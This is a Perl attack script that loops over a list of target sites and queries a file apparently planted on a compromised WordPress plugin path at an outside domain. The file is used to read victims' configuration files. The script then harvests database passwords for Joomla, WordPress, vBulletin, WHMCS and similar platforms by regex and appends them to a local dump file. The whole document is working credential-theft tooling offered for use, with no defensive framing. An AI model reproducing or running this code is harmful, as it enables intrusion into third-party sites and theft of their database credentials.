#!/usr/bin/perl
use IO::Select;
use HTTP::Response;
use HTTP::Request::Common qw(GET);
use URI::URL;
use IO::Socket::INET;
use Term::ANSIColor qw(:constants);
use MIME::Base64;
use LWP;
use HTTP::Cookies;
use HTML::Entities;
use URI::Escape;
use Win32::Console::ANSI;
use Term::ANSIColor;
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Request::Common qw(POST);
use LWP::UserAgent;
use HTTP::Request::Common;
use Term::ANSIColor;
use HTTP::Request::Common qw(GET);
$ag = LWP::UserAgent->new();
use MIME::Base64;

print "List : \n";
$list=<STDIN>;
open(tarrget,"<$list") or die "add list \n";
while(<tarrget>){
$site = $_;
pass();
}

sub pass(){

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);
my $taz = "http://internationalship.com.bd/wp-content/plugins/xaisyndicate/bypass.php?ficonf=$site&namef=spyc&submit=submit";
my $checkfoxup = $ua->get("$taz")->content;
tazx();
sub tazx(){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (15);
#// here put ur config link 
$sex ="http://internationalship.com.bd/wp-content/plugins/xaisyndicate/spyc/";
my $cont = $ua->get("$sex")->content;

# // Fuck Off kids  Spy always a geniuses   //


  print color('reset');

        if ($cont =~ /password = \'(.*?)\';/){ #jm
		print color('bold green');
        print "\t Pass = $1 -Joomla \n";
	    print color('reset');
        open (TEXT, '>>passworddumped.txt');
        print TEXT "$1\n";
        close (TEXT);
  } elsif ($cont =~ /'DB_PASSWORD\', \'(.*)\'/){ #wordpress
  	    print color('bold green');
        print "\t Pass = $1  - wordpress\n";
	    print color('reset');
        open (TEXT, '>>passworddumped.txt');
        print TEXT "$1\n";
        close (TEXT);
  } elsif ($cont =~ /password_localhost = "(.*)"/){ #conexao.php
        print "\t Pass = $1 \n";
        open (TEXT, '>>passworddumped.txt');
        print TEXT "$1\n";
        close (TEXT);
  }elsif ($cont =~ /password\'] = \'(.*)/){ #vb
        print "\t Pass = $1 \n";
        open (TEXT, '>>passworddumped.txt');
        print TEXT "$1\n";
        close (TEXT);
  }elsif ($cont =~ /db_password = "(.*)"/){ #whmcs
        print "\t Pass = $1 \n";
        open (TEXT, '>>passworddumped.txt');
        print TEXT "$1\n";
        close (TEXT);
  }elsif ($cont =~ /db_pwd =  "(.*)"/){
        print "\t Pass = $1 \n";
        open (TEXT, '>>passworddumped.txt');
        print TEXT "$1\n";
        close (TEXT);
  }elsif ($cont =~ /config\[\'db_pass\'\] = \'(.*)\'/){
        print "\t Pass = $1 \n";
        open (TEXT, '>>passworddumped.txt');
        print TEXT "$1\n";
        close (TEXT);
  }
  
else{
print "No PassWord 0x0";
print "\n";

    }

}
        }
	

